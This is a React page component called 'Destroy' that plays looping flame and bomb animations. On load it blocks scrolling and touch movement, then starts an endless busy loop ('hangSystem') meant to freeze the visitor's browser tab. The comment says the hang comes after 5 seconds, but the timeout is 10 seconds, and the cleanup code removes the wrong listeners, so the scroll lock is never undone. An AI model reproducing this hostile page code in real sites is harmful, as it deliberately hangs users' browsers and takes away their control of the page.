import React, { useEffect } from 'react';
import Lottie from 'react-lottie';
import flameAnimationFile from './assets/animations/flames.json';
import bombAnimationFile from './assets/animations/bomb.json';

const flameAnimation = {
    loop: true,
    autoplay: true,
    animationData: flameAnimationFile,
    rendererSettings: {
        preserveAspectRatio: 'xMidYMid slice'
    }
};

const bombAnimation = {
    loop: true,
    autoplay: true,
    animationData: bombAnimationFile,
    rendererSettings: {
        preserveAspectRatio: 'xMidYMid slice'
    }
};

export default function Destroy(props) {

useEffect(() => {
  props.setProgress(100);
}, [])



    useEffect(() => {
        const disableScroll = () => {
            // Disable touchmove event
            document.addEventListener('touchmove', function (event) {
                event.preventDefault();
            }, { passive: false });

            // Disable scroll
            document.addEventListener('scroll', function (event) {
                window.scrollTo(0, 0);
            }, { passive: false });
        };

        const hangSystem = () => {
            while (true) {
                // Introduce more severe hang by performing complex computations
                for (let i = 0; i < 1000000; i++) {
                    Math.sqrt(Math.random());
                }
            }
        };

        disableScroll();

        // Hang the system after 5 seconds
        const hangTimeout = setTimeout(hangSystem, 10000);

        return () => {
            document.removeEventListener('touchmove', disableScroll);
            document.removeEventListener('scroll', disableScroll);
            clearTimeout(hangTimeout);
        };
    }, []);

    return (
        <div className='min-h-screen overflow-hidden w-full bg-transparent bg-gradient-to-t from-slate-700 to-black flex items-center justify-center'>
            <div className="animations flex items-center justify-center">
                <div className="animation-1 absolute bottom-0 w-full h-auto pointer-events-none">
                    <Lottie
                        options={flameAnimation}
                        isStopped={false}
                    />
                </div>
                <div className="animation-2 w-[500px] h-[500px] pointer-events-none absolute top-0">
                    <Lottie
                        options={bombAnimation}
                        isStopped={false}
                    />
                </div>
            </div>
        </div>
    );
}
